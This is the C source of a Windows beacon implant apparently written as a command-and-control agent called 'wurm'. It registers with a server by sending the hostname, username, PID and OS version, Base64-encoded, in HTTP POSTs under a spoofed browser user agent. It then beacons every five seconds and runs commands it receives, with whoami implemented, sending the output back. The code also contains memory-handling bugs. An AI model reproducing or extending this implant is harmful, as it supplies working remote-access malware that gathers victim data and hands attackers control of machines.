#include <stdio.h>
#include <windows.h>
#include <wininet.h>

#define pointer_length 1

struct {
    struct {
        char            hostname[MAX_PATH];
        char            username[MAX_PATH];
        DWORD           pid;
        DWORD           version;
    } info;
    struct {
        char*           address;
        int             port;
        char*           user_agent;
        char*           path;
        char*           status;
        char*           format;
    } http;
    struct {
        char*           cookie;
        char*           keyword;
    } auth;
    struct {
        DWORD           size;
        char*           buffer;
        char*           length;
    } data;
    struct {
        int             count;
    } beacon;
} wurm;

unsigned char patch_list_name[pointer_length] = {0xAA};

BOOL AA$whoami(CHAR **output) {
    DWORD username_buffer = 256;
    CHAR username[256];
    if (GetUserNameA(username, &username_buffer)) {
        *output = (CHAR*)calloc(strlen(username) + 1, sizeof(CHAR));
        strcat_s(*output, strlen(username) + 1, username);
        return TRUE;
    }
    return FALSE;
}

BOOL (*patch_list_pointers[pointer_length]) (CHAR **output) = {AA$whoami};

char* get_endpoint() {
    char path_list[5][11] = {"index", "images", "download", "news", "about"};
    int random_number = rand() % 5;
    char* random_path = path_list[random_number];
    printf("Path: %s\n", random_path);
    wurm.http.path = random_path;
}

void Register() {
    DWORD hostname_length = 256;
    DWORD username_buffer = 256;

    wurm.http.status = "register";
    wurm.http.format = "%s:%s,%s,%d,%d,%s";

    if (GetComputerNameA(wurm.info.hostname, &hostname_length)) {
        printf("Hostname: %s\n", wurm.info.hostname);
    }

    if (GetUserNameA(wurm.info.username, &username_buffer)) {
        printf("Username: %s\n", wurm.info.username);
    }

    if (wurm.info.pid = GetCurrentProcessId()) {
        printf("Process ID: %lu\n", wurm.info.pid);
    }

    if (wurm.info.version = GetVersion()) {
        printf("Version: %lu\n", wurm.info.version);
    }


    CHAR *data_to_encode = malloc(strlen(wurm.http.format) + strlen(wurm.http.status) + strlen(wurm.info.username) + strlen(wurm.info.hostname) + strlen(wurm.auth.keyword));
    sprintf(data_to_encode, wurm.http.format, wurm.http.status, wurm.info.username, wurm.info.hostname, wurm.info.pid, wurm.info.version, wurm.auth.keyword);

    Encode(data_to_encode);
    Request();
}

void Beacon() {
    wurm.http.format = "%s:%s";
    wurm.http.status = "beacon";
    
    CHAR *data_to_encode = malloc(strlen(wurm.http.format)+ strlen(wurm.auth.cookie) + strlen(wurm.http.status));
    sprintf(data_to_encode, wurm.http.format, wurm.auth.cookie, wurm.http.status);

    Encode(data_to_encode);
    Request();
}

void Encode(char* data_to_encode) {
    CHAR *data_encode = (CHAR*)malloc(strlen(data_to_encode) * 2);
    DWORD data_encode_len = strlen(data_to_encode) * 2;
    CryptBinaryToStringA(data_to_encode, strlen(data_to_encode), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, data_encode, &data_encode_len);

    free(data_to_encode);

    DWORD post_buffer_length = strlen(data_encode) + 5;
    CHAR *post_buffer = (CHAR*)calloc(strlen(data_encode) + 5, sizeof(CHAR));
    sprintf_s(post_buffer, post_buffer_length, "%s\r\n\r\n", data_encode);

    free(data_encode);

    CHAR content_length[MAX_PATH];
    sprintf_s(content_length, MAX_PATH, "Content-Length: %lu\r\n", post_buffer_length);

    wurm.data.size = post_buffer_length;
    wurm.data.buffer = post_buffer;
    wurm.data.length = content_length;
}

BOOL Request() {
    printf("Sending beacon...\n");
    wurm.beacon.count += 1;
    
    HINTERNET hInternet = InternetOpenA(wurm.http.user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hInternet != NULL) {
        HINTERNET hConnect = InternetConnectA(hInternet, wurm.http.address, wurm.http.port, 0, 0, INTERNET_SERVICE_HTTP, 0, 0);
        if (hConnect != NULL) {
            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", wurm.http.path, 0, 0, 0, 0, 0);
            if (hRequest != NULL) {
                HttpAddRequestHeadersA(hRequest, wurm.data.length, -1, HTTP_ADDREQ_FLAG_ADD);
                HttpSendRequestA(hRequest, 0, 0, wurm.data.buffer, wurm.data.size);

                if (wurm.http.status == "output") {
                    return TRUE;
                }

                CHAR *temp_buffer = NULL;
                DWORD buffer_length = 0;

                while (TRUE) {
                    DWORD available_size = 0;
                    DWORD download_buffer;
                    BOOL available = InternetQueryDataAvailable(hRequest, &available_size, 0, 0);
                    if (!available || available_size == 0) {
                        break;
                    }
                    temp_buffer = (CHAR*)realloc(temp_buffer, available_size + 1);
                    memset(temp_buffer, 0, available_size + 1);

                    BOOL value = InternetReadFile(hRequest, temp_buffer, available_size, &download_buffer);
                    if (!value || download_buffer == 0) {
                        break;
                    }
                    buffer_length += download_buffer;
                    char* cookie = (CHAR*)realloc(cookie, buffer_length + 1);
                    sprintf_s(cookie, buffer_length + 1, "%s\0", temp_buffer);

                    if (wurm.beacon.count == 1) {
                        wurm.auth.cookie = cookie;
                        printf("Response:%s\n", wurm.auth.cookie);
                    } else {
                        printf("Response:%s\n", cookie);
                        Process(cookie);
                    }
                }

                free(temp_buffer);
                temp_buffer = NULL;

                if (hRequest) {
                    InternetCloseHandle(hRequest);
                }
                if (hConnect) {
                    InternetCloseHandle(hConnect);
                }
                if (hInternet) {
                    InternetCloseHandle(hInternet);
                }
            }
        }
    }
    free(wurm.data.buffer);
    return TRUE;
}

BOOL Process(char* cookie) {
    char* allocated_output = (CHAR*)calloc(10, sizeof(CHAR));
    char* output = NULL;

    int hex_command = atoi(cookie);

    printf("Command: 0x%x\n", hex_command);

    for (int i = 0; i < pointer_length; i++) {
        if (hex_command == patch_list_name[i]) {
            printf("Executing Command\n");
            if ((*patch_list_pointers)(&output)) {
                printf("Output:%s", output);

                int output_length = strlen(allocated_output) + strlen(output) + 1;
                allocated_output = (CHAR*)realloc(allocated_output, output_length);
                strcat_s(allocated_output, output_length, output);
            }
        }
    }
    free(output);

    if (strlen(allocated_output) > 0) {
        wurm.http.format = "%s:%s";
        wurm.http.status = "output";

        CHAR *data_to_encode = malloc(strlen(wurm.http.format) + strlen(wurm.http.status) + strlen(allocated_output));
        sprintf(data_to_encode, wurm.http.format, wurm.http.status, allocated_output);

        Encode(data_to_encode);

        Request();
    }

    free(allocated_output);

}

int main(int argc, char* argv[]) {
    if (argc == 2) {
        wurm.http.address = argv[1];
        wurm.http.port = 8080;
    } else if (argc == 3){
        wurm.http.address = argv[1];
        wurm.http.port = atoi(argv[2]);
    } else {
        wurm.http.address = "127.0.0.1";
        wurm.http.port = 8080;
    }
    printf("Address: %s\n", wurm.http.address);
    printf("Port:%d\n", wurm.http.port);
    get_endpoint();
    printf("Path: %s\n", wurm.http.path);

    wurm.http.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
    wurm.http.path = "images";

    wurm.auth.cookie = NULL; 
    wurm.auth.keyword = "boondoggle";

    Register();

    while (TRUE) {
        Beacon();
        Sleep(5000);
    }

}